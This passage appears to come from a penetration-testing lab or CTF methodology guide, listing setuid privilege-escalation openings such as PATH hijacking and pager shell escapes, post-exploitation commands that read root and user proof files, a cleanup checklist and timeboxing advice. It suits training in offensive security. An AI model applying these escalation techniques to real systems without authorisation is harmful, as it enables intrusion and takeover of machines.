What you are looking for, in priority order:

  1. system() / popen() with a bare command name → PATH hijack (CWE-426)
  2. setuid(0)/seteuid(0) before that call → the shell will not drop privileges → full root
  3. A writable path used by root → symlink or overwrite attack
  4. A shell escape in a pager/editor it invokes

If the binary is setuid and setgid, or lives in a user-writable directory, the box author is telling you this is the path.

Phase 7 — Post-exploitation and reporting

command
cat /root/proof.txt; cat /home/*/local.txt
ip a; ip r          # can this host pivot? (single NIC + default route = no)

Record: exact flags, the id output as root, the mechanism in one paragraph, and every command with its output. Then clean up.

Cleanup checklist

  • Remove every file you created, then verify with ls.
  • Revert any file you modified.
  • Do not change credentials you do not own; if an exploit would have (this box's chpasswd), note that it did not run.
  • Note in the report what you changed and what you left alone.

Timeboxing heuristics

Situation Budget Move on when
Web on a stock default page 10 min Two wordlists + vhosts agree there is nothing
Version-CVE rabbit hole 5 min The package revision shows the backport
Credential guessing 5 min per service Account-specific defaults exhausted
Generic privesc sweep 15 min A custom SUID/service/cron finding exists

The recurring lesson: spend the time on the surface you have not looked at, not on the one you have already disproved. On this box, thirty UDP ports were worth more than an hour of web.
